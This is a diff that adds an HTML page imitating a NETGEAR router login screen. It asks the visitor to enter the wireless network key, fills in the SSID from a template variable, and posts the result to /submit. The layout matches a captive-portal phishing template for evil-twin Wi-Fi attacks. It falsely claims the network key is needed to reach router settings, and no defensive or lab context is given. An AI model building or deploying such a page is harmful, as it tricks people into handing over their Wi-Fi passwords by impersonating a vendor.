@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NETGEAR Router Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1e3a5f;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 420px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        .header {
+            background: #1e3a5f;
+            color: white;
+            padding: 25px;
+            text-align: center;
+            border-radius: 8px 8px 0 0;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .content {
+            padding: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1e3a5f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #2a4d7a;
+        }
+        .note {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f5f5f5;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">NETGEAR</div>
+            <div>Wireless Router</div>
+        </div>
+        <div class="content">
+            <form method="POST" action="/submit">
+                <div class="form-group">
+                    <label>Network Name (SSID):</label>
+                    <input type="text" name="ssid" value="{{ssid}}" required>
+                </div>
+                <div class="form-group">
+                    <label>Network Key (Password):</label>
+                    <input type="password" name="password" required>
+                </div>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="note">
+                Enter your wireless network credentials to access router settings.
+            </div>
+        </div>
+    </div>
+</body>
+</html>
